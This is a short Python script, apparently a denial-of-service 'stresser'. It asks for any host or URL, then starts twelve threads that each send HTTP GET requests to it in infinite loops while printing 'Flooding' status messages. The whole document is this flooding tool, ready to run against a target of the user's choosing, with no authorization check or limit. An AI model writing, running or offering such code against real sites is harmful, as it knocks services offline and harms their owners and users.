import threading
import requests as r


def stresser(host):
    while True:
        try:
            r.get(host)
        except (r.ConnectionError, r.HTTPError):
            print("[*] Unable to reach the host. Try again.")
        except UnboundLocalError:
            print("[*] Incorrect host. Provide a correct one.")
        threads_ = threading.active_count()
        print("[*] Flooding: {}. Active threads: {}".format(host, threads_))


def start():
    host = input("Enter host / URL: ")
    threads = [threading.Thread(target=stresser, args=(host,)) for _ in range(12)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    stresser(host=host)


start()
